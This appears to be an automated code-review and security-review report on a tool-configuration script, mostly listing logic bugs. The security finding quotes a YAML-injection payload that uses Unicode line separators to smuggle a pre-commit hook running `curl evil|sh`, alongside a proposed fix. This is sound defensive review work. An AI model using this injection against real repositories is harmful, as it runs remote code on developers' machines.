== /code-review high 2026-10-01-tool-config-script-gates (range 4322d619..e87e7c62, committed only) ==

1. lib/run.mjs:83 — (checked on this machine) trust() compares `mise trust --show` paths against an absolute realpath, but mise prints paths under $HOME as `~/...`; no untrusted path ever matches, so the trust check does nothing for any repo under the home directory. The test fake prints `$(pwd -P): untrusted`, hiding it.
2. lib/run.mjs:52 — (checked) only setupAll() sets MISE_ENV=dev; `mise which` and `mise x -- dprint|pre-commit` inherit the caller's env, but dprint and pre-commit are pinned only in tools.dev.toml — without MISE_ENV=dev `mise which dprint` resolves the global 0.58.0 instead of the pinned 0.57.4, or ensure() refuses with a remedy that changes nothing. The test asserts `MISE_ENV= x -- dprint fmt`, locking the bug in.
3. lib/tools/pre-commit.mjs:796 — renameRows drops a non-standard type with drop-lines match `- <type>`; dropLines matches by prefix anywhere, so `- doc` also deletes `- docs …` from commitTypes and `ci` deletes a scope `- ci-runner`.
4. tool-config.mjs:952 — when setup:all (or the post-write trust check) fails, written files stay and no lock record is written; the re-run all finds every file equal to its rendering (landOps returns []), writes nothing, records nothing — every later requester call refuses 'no tool-config record — run all first' forever.
5. lib/tools/pre-commit.mjs:430 — addHook's no-op check ignores `rev`; a pack bumping a URL hook's rev gets no write; putHook never updates rev.
6. lib/tools/pre-commit.mjs:363 — a requester's hook id moving to another repo is added under a new entry without removing the old one; two hooks of one id.
7. lib/tools/index.mjs:229 — on a migration (supersedes), landOps force-writes a rendering carrying only list positions and blocks; gitleaks [[rules]], other allowlist keys, top-level hook-config keys, hooks added inside a base repo entry and linter rule edits are silently dropped, no drift row.
8. lib/tools/grype.mjs:145 — dropEntry removes only the `- vulnerability:` line and comments above; keys under the entry (package:, fix-state:, namespace:) stay and attach to the previous entry or break YAML.
9. lib/tools/pre-commit.mjs:463 — the overwrite effect on addHook's conflict row is a whole-file snapshot taken at plan time; it runs after every call in the batch and discards later calls' writes.
10. lib/tools/pre-commit.mjs:926 — `.config/pre-commit.d/*` fragments are deleted even when the hook config is foreign or absent and nothing merged them.
Lower: add-linter-ignore always appends `/` (a file glob *.lock becomes **/*.lock/); check.ts keeps its own dprint plugin table copy; node = latest in base tools.dev.toml raises a conflict row in every Node project pinning node.

== /security-review (subagent) ==

1. (Medium, 8/10) YAML injection via Unicode line separator → command execution. lib/schema.mjs:97 `line` flag type rejects only \r and \n; lib/tools/pre-commit.mjs:83-88 yamlScalar writes values unquoted with [^\n]*, letting U+2028/U+2029/U+0085 through; PyYAML/libyaml treat them as line breaks. A pack's add-hook `files: "x       - {id: e, entry: "sh -c 'curl evil|sh'", language: system}"` parses (verified with PyYAML) as a second hook that runs on the next commit, bypassing hookFaults' mise x -- / language: system rule; the consent diff splits on \n only so the line looks innocent. Fix: `line` rejects [\r\n\u0085  ] and other controls; yamlScalar writes plain only for strict printable ASCII, else double-quotes with those escaped (JSON.stringify leaves them unescaped). Same gap reaches grype reason (no execution).
Clean: spawn arrays everywhere; every write/delete/restore via ws.safe(); exclude paths reject whitespace, commas, ..; regex metacharacters escaped.
